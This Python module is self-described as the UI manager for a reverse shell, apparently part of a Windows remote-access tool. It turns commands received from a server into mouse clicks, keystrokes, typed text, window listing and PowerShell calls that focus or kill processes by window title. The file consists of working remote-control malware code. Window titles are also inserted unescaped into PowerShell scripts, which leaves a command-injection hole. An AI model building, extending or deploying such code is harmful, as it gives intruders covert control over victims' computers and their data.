"""
This module contains the UI manager for the reverse shell.
"""

# 1st party imports
import time
import ctypes
import subprocess
from ctypes import wintypes
from typing import List, Tuple

# local imports
from commands import ShellCommands

# use with .format(tab_name)
FOCUS_SCRIPT = """
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {{
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
}}
"@

$process = Get-Process | Where-Object {{ $_.MainWindowTitle -eq '{}' }}
if ($process) {{
    [Win32]::ShowWindow($process.MainWindowHandle, 3)
    [Win32]::SetForegroundWindow($process.MainWindowHandle)
}} else {{
    Write-Host "Tab not found."
}}"""


# use with .format(tab_name)
CLOSE_SCRIPT = """
Get-Process | Where-Object {{ $_.MainWindowTitle -eq '{}' }} | Stop-Process
"""

class CursorPoint(ctypes.Structure):
    """
    The CursorPoint structure contains information about the cursor position.

    fields:
        x: The x-coordinate of the cursor
        y: The y-coordinate of the cursor
    """

    _fields_ = [
        ("x", wintypes.LONG),
        ("y", wintypes.LONG),
    ]


class MOUSEINPUT(ctypes.Structure):
    """
    The MOUSEINPUT structure contains information about a mouse movement or button press or release.

    fields:
        dx: The x-coordinate of the mouse cursor
        dy: The y-coordinate of the mouse cursor
        mouseData: Data for the mouse event. 0 is normal. Any other value is used to scroll up or down.
        dwFlags: The type of mouse event. `MOUSEEVENTF_LEFTDOWN` is left click. `MOUSEEVENTF_LEFTUP` is left release.
                `MOUSEEVENTF_RIGHTDOWN` is right click. `MOUSEEVENTF_RIGHTUP` is right release.
                `MOUSEEVENTF_MIDDLEDOWN` is middle click. `MOUSEEVENTF_MIDDLEUP` is middle release.
                `MOUSEEVENTF_WHEEL` is wheel scroll.
        time: The time the event occurred
        dwExtraInfo: Extra information about the event
    """

    _fields_ = [
        ("dx", wintypes.LONG),
        ("dy", wintypes.LONG),
        ("mouseData", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]


class KEYBDINPUT(ctypes.Structure):
    """
    The KEYBDINPUT structure contains information about a key press or release.

    fields:
        wVk: The virtual-key code of the key
        wScan: The hardware scan code of the key
        dwFlags: The type of key event. `KEYEVENTF_KEYUP` is key release. `KEYEVENTF_KEYUP` is key release.
        time: The time the event occurred
        dwExtraInfo: Extra information about the event
    """

    _fields_ = [
        ("wVk", wintypes.WORD),
        ("wScan", wintypes.WORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]


class HARDWAREINPUT(ctypes.Structure):
    """
    The HARDWAREINPUT structure contains information about a hardware event.

    fields:
        uMsg: The message
        wParamL: The low-order word of the hardware event
        wParamH: The high-order word of the hardware event
    """

    _fields_ = [
        ("uMsg", wintypes.DWORD),
        ("wParamL", wintypes.WORD),
        ("wParamH", wintypes.WORD),
    ]


class _INPUT_UNION(ctypes.Union):
    """
    The _INPUT_UNION union contains information about an input event.

    fields:
        mi: The mouse input
        ki: The keyboard input
        hi: The hardware input (Rarely Used)
    """

    _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT), ("hi", HARDWAREINPUT)]


class INPUT(ctypes.Structure):
    """
    The INPUT structure contains information about an input event.

    fields:
        type: The type of input event
        union: The union of input events
    """

    _fields_ = [("type", wintypes.DWORD), ("union", _INPUT_UNION)]


class UIManager:
    """
    The UI manager for the reverse shell.
    """

    def __init__(self):
        """
        This function initializes the UI manager.

        format:
            SendInput(
                nInputs: int,
                pInputs: ctypes.POINTER(INPUT),
                cbSize: int
            )
        """

        # get the send input function
        self.input_handler = ctypes.windll.user32.SendInput

        # get the user32.dll
        self.user32 = ctypes.windll.user32

        # constants
        self.INPUT_KEYBOARD = 1
        self.INPUT_MOUSE = 0

        # key up and down
        self.KEYEVENTF_KEYDOWN = 0x0000
        self.KEYEVENTF_KEYUP = 0x0002

        # mouse events
        self.MOUSEEVENTF_LEFTDOWN = 0x0002  # Left button down
        self.MOUSEEVENTF_LEFTUP = 0x0004  # Left button up
        self.MOUSEEVENTF_RIGHTDOWN = 0x0008  # Right button down
        self.MOUSEEVENTF_RIGHTUP = 0x0010  # Right button up
        self.MOUSEEVENTF_MIDDLEDOWN = 0x0020  # Middle button down
        self.MOUSEEVENTF_MIDDLEUP = 0x0040  # Middle button up
        self.MOUSEEVENTF_WHEEL = 0x0800  # Mouse wheel scroll

        # Key mapping for special keys
        self.KEY_MAPPING = {
            "backspace": 0x08,
            "tab": 0x09,
            "clear": 0xFE,
            "enter": 0x0D,
            "shift": 0x10,
            "caps_lock": 0x14,
            "esc": 0x1B,
            "space": 0x20,
            "page_up": 0x21,
            "page_down": 0x22,
            "end": 0x23,
            "home": 0x24,
            "left_arrow": 0x25,
            "up_arrow": 0x26,
            "right_arrow": 0x27,
            "down_arrow": 0x28,
            "select": 0x29,
            "print": 0x2A,
            "insert": 0x2D,
            "delete": 0x2E,
            "left_windows": 0x5B,
            "right_windows": 0x5C,
            "multiply": 0x6A,
            "add": 0x6B,
            "separator": 0x6C,
            "subtract": 0x6D,
            "decimal": 0x6E,
            "divide": 0x6F,
            "f1": 0x70,
            "f2": 0x71,
            "f3": 0x72,
            "f4": 0x73,
            "f5": 0x74,
            "f6": 0x75,
            "f7": 0x76,
            "f8": 0x77,
            "f9": 0x78,
            "f10": 0x79,
            "f11": 0x7A,
            "f12": 0x7B,
            "f13": 0x7C,
            "f14": 0x7D,
            "f15": 0x7E,
            "f16": 0x7F,
            "f17": 0x80,
            "f18": 0x81,
            "f19": 0x82,
            "f20": 0x83,
            "f21": 0x84,
            "f22": 0x85,
            "f23": 0x86,
            "f24": 0x87,
            "num_lock": 0x90,
            "scroll_lock": 0x91,
            "left_shift": 0xA0,
            "right_shift": 0xA1,
            "left_ctrl": 0xA2,
            "right_ctrl": 0xA3,
            "left_alt": 0xA4,
            "right_alt": 0xA5,
            "volume_mute": 0xAD,
            "volume_down": 0xAE,
            "volume_up": 0xAF,
        }

    def get_vk(self, char: str) -> int:
        """
        This function returns the virtual key code for a given character.

        Args:
            char (str): The character to get the virtual key code for.

        Returns:
            tuple: A tuple containing the virtual key code and shift state.
        """

        if len(char) != 1:
            return self.KEY_MAPPING.get(char)

        # get the virtual key code
        result = self.user32.VkKeyScanW(ord(char))
        vk = result & 0xFF
        return vk

    def get_cursor_pos(self) -> Tuple[int, int]:
        """
        This function returns the cursor position.

        Returns:
            tuple: A tuple containing the x and y coordinates.
        """

        # create a empty CursorPoint Obj
        cursor_point = CursorPoint()
        self.user32.GetCursorPos(ctypes.byref(cursor_point))
        return cursor_point.x, cursor_point.y

    def show_desktop(self) -> str:
        """
        This function shows the desktop using keyboard shortcuts.
        Shortcut: `Windows + D`

        Returns:
            str: The output of the command or error message.
        """

        try:
            self.perform_keyboard_combos(
                ["left_windows-down", "d-down", "left_windows-up", "d-up"]
            )
            return "Desktop shown"

        except Exception as e:
            return "Failed to show desktop: {}".format(e)

    def type_sentence(self, sentence: str) -> str:
        """
        This function types a sentence or a word or even a single character.

        Args:
            sentence (str): The sentence to type.

        Returns:
            str: The output of the command or error message.
        """

        try:

            for char in sentence:

                # get the virtual key
                vk = self.get_vk(char)

                # if the key does not exists break
                if not vk:
                    return (
                        "Failed to type sentence: Key not found for character: {}".format(char)
                    )

                # type the key
                self.input_handler(
                    1,
                    ctypes.pointer(
                        INPUT(
                            type=self.INPUT_KEYBOARD,
                            union=_INPUT_UNION(
                                ki=KEYBDINPUT(
                                    wVk=vk,
                                    wScan=0,
                                    dwFlags=self.KEYEVENTF_KEYDOWN,
                                    time=0,
                                    dwExtraInfo=None,
                                )
                            ),
                        )
                    ),
                    ctypes.sizeof(INPUT),
                )

                # wait a bit
                time.sleep(0.05)

                # bring the key up
                self.input_handler(
                    1,
                    ctypes.pointer(
                        INPUT(
                            type=self.INPUT_KEYBOARD,
                            union=_INPUT_UNION(
                                ki=KEYBDINPUT(
                                    wVk=vk,
                                    wScan=0,
                                    dwFlags=self.KEYEVENTF_KEYUP,
                                    time=0,
                                    dwExtraInfo=None,
                                )
                            ),
                        )
                    ),
                    ctypes.sizeof(INPUT),
                )

            return "Sentence typed: {}".format(sentence)

        except Exception as e:
            return "Failed to type sentence: {}".format(e)

    def left_click(self, x: int = None, y: int = None) -> str:
        """
        This function performs a left click.

        Args:
            x (int): The x coordinate.
            y (int): The y coordinate.

        Returns:
            str: The output of the command or error message.
        """

        try:

            # if x and y cords are not provided get the current position
            if x is None or y is None:

                # get cursor position
                x, y = self.get_cursor_pos()

            # left key down
            left_mouse_key_down = INPUT(
                type=self.INPUT_MOUSE,
                union=_INPUT_UNION(
                    mi=MOUSEINPUT(x, y, 0, self.MOUSEEVENTF_LEFTDOWN, 0, None)
                ),
            )

            # left key up
            left_mouse_key_up = INPUT(
                type=self.INPUT_MOUSE,
                union=_INPUT_UNION(
                    mi=MOUSEINPUT(x, y, 0, self.MOUSEEVENTF_LEFTUP, 0, None)
                ),
            )

            # send the inputs
            self.input_handler(
                2,
                ctypes.pointer((INPUT * 2)(left_mouse_key_down, left_mouse_key_up)),
                ctypes.sizeof(INPUT),
            )

        except Exception as e:
            return "Left click failed: {}".format(e)

        return "Left click performed"

    def right_click(self, x: int = None, y: int = None) -> str:
        """
        This function performs a right click.

        Args:
            x (int): The x coordinate.
            y (int): The y coordinate.

        Returns:
            str: The output of the command or error message.
        """

        try:

            # if x and y cords are not provided get the current position
            if x is None or y is None:

                # get cursor position
                x, y = self.get_cursor_pos()

            # right key down
            right_mouse_key_down = INPUT(
                type=self.INPUT_MOUSE,
                union=_INPUT_UNION(
                    mi=MOUSEINPUT(x, y, 0, self.MOUSEEVENTF_RIGHTDOWN, 0, None)
                ),
            )

            # right key up
            right_mouse_key_up = INPUT(
                type=self.INPUT_MOUSE,
                union=_INPUT_UNION(
                    mi=MOUSEINPUT(x, y, 0, self.MOUSEEVENTF_RIGHTUP, 0, None)
                ),
            )

            # send the inputs
            self.input_handler(
                2,
                ctypes.pointer((INPUT * 2)(right_mouse_key_down, right_mouse_key_up)),
                ctypes.sizeof(INPUT),
            )

        except Exception as e:
            return "Right click failed: {}".format(e)

        return "Right click performed"

    def click_x_y(self, x: int, y: int, left: bool = True) -> str:
        """
        This function clicks at the given x and y coordinates.

        Args:
            x (int): The x coordinate.
            y (int): The y coordinate.
            left (bool): Whether to perform a left click or a right click.

        Returns:
            str: The output of the command or error message.
        """

        # set the cursor position
        self.user32.SetCursorPos(x, y)

        # perform a left click
        if left:
            self.left_click(x, y)
            return "Left click performed at cords ({}, {})".format(x, y)
        else:
            self.right_click(x, y)
            return "Right click performed at cords ({}, {})".format(x, y)

    def scroll_mouse(self, scroll_power: int) -> str:
        """
        This function scrolls the mouse.

        Args:
            scroll_power (int): The power of the scroll.

        Returns:
            str: The output of the command or error message.
        """

        try:

            # multiply the scroll_power by 120
            scroll_power *= 120

            # create a extra memory space
            extra_memory = ctypes.pointer(ctypes.c_ulong(0))

            # scroll the mouse
            self.input_handler(
                1,
                ctypes.pointer(
                    INPUT(
                        type=self.INPUT_MOUSE,
                        union=_INPUT_UNION(
                            mi=MOUSEINPUT(
                                0,
                                0,
                                scroll_power,
                                self.MOUSEEVENTF_WHEEL,
                                0,
                                extra_memory,
                            )
                        ),
                    )
                ),
                ctypes.sizeof(INPUT),
            )

            return "Mouse scrolled"

        except Exception as e:
            return "Failed to scroll mouse: {}".format(e)

    def switch_tab(self) -> str:
        """
        This function switches to the next tab.
        Shortcut: `left_alt + tab`

        Returns:
            str: The output of the command or error message.
        """

        try:
            self.perform_keyboard_combos(
                ["left_alt-down", "tab-down", "left_alt-up", "tab-up"]
            )
            return "Switched to the next tab"

        except Exception as e:
            return "Failed to switch to the next tab: {}".format(e)

    def perform_keyboard_combos(self, keys: List[str]) -> bool:
        """
        This function performs a series of keyboard combinations based on the provided keys list.

        Args:
            keys (list[str]): A list of keys to be pressed in sequence.
                              The list can contain special strings like "wait" to introduce pauses.

        Returns:
            bool: Returns True if the key combinations were successfully performed, otherwise False.
        """

        # collect all the inputs
        key_inputs = []

        for key in keys:

            # remove the spaces
            key = key.strip()

            # check if it is a wait sign
            if key == "wait":
                key_inputs.append("wait")
                continue

            # seperate the key and action
            key, action = key.split("-")

            # get the virtual key
            key_vk = self.get_vk(key)

            # if the virtual key is not available return
            if not key_vk:
                return False

            # append to the inputs
            key_inputs.append(
                INPUT(
                    type=self.INPUT_KEYBOARD,
                    union=_INPUT_UNION(
                        ki=KEYBDINPUT(
                            wVk=key_vk,
                            wScan=0,
                            dwFlags=(
                                self.KEYEVENTF_KEYDOWN
                                if action == "down"
                                else self.KEYEVENTF_KEYUP
                            ),
                            time=0,
                            dwExtraInfo=None,
                        )
                    ),
                )
            )

        # perform the action one by one
        for key_input in key_inputs:

            # wait before next action
            if key_input == "wait":
                time.sleep(0.1)
                continue

            # send the input
            self.input_handler(
                1,
                ctypes.pointer(key_input),
                ctypes.sizeof(INPUT),
            )

        return True

    def focus_on_tab(self, tab_name: str) -> str:
        """
        This function focuses on the given tab.

        Args:
            tab_name (str): The name of the tab to focus on.

        Returns:
            str: The output of the command or error message.
        """

        # command used
        cmd = ["powershell", "-NoProfile", "-Command", FOCUS_SCRIPT.format(tab_name)]

        # focus on the tab
        try:
            subprocess.call(cmd)
            return "Focused on tab: {}".format(tab_name)
        except Exception as e:
            return "Failed to focus on tab: {}".format(e)

    def close_tab(self, tab_name: str):
        """
        This function closes the given tab.

        Args:
            tab_name (str): The name of the tab to close.

        Returns:
            bool: True if the tab was closed, False otherwise.
        """

        # close the tab
        try:
            subprocess.call(["powershell", "-NoProfile", "-Command", CLOSE_SCRIPT.format(tab_name)], text=True)
            return "Closed tab: {}".format(tab_name)
        except Exception as e:
            return "Failed to close tab: {}".format(e)

    def get_active_windows(self) -> List[str]:
        """
        This function returns the active windows.

        Returns:
            list: The list of active windows.
        """

        # get the active windows
        ps_command = (
            "Get-Process | "
            "Where-Object { $_.MainWindowTitle } | "
            "Select-Object ProcessName, MainWindowTitle"
        )
        command = ["powershell", "-NoProfile", "-Command", ps_command]

        # check the output
        res = subprocess.check_output(command, text=True)

        # return the output
        return res

    def handle_command(self, command: List[str]) -> str:
        """
        Handle the command received from the server.

        Args:
            command (List[str]): The list of commands to handle with args.

        Returns:
            str: The output of the command.
        """

        if command[0] == ShellCommands.LEFT_CLICK.value:
            return self.left_click()

        elif command[0] == ShellCommands.RIGHT_CLICK.value:
            return self.right_click()

        elif command[0] == ShellCommands.CLICK_X_Y_LEFT.value:

            # get the x and y cords
            x, y = command[1], command[2]

            # click at the x and y cords
            return self.click_x_y(int(x), int(y), left=True)

        elif command[0] == ShellCommands.CLICK_X_Y_RIGHT.value:

            # get the x and y cords
            x, y = command[1], command[2]

            # click at the x and y cords
            return self.click_x_y(int(x), int(y), left=False)

        elif command[0] == ShellCommands.SWITCH_TAB.value:
            return self.switch_tab()

        elif command[0] == ShellCommands.SHOW_DESKTOP.value:
            return self.show_desktop()

        elif command[0] == ShellCommands.TYPE_SENTENCE.value:
            return self.type_sentence(" ".join(command[1:]))

        elif command[0] == ShellCommands.SCROLL_MOUSE.value:
            return self.scroll_mouse(int(command[1]))

        elif command[0] == ShellCommands.PERFORM_COMBO.value:
            return self.perform_keyboard_combos(command[1:])

        elif command[0] == ShellCommands.GET_ACTIVE_WINDOWS.value:
            return self.get_active_windows()

        elif command[0] == ShellCommands.FOCUS_ON_TAB.value:
            return self.focus_on_tab(command[1])

        elif command[0] == ShellCommands.CLOSE_TAB.value:
            return self.close_tab(command[1])

        else:
            return "Invalid command for ui manager. Provided command: {}".format(command)
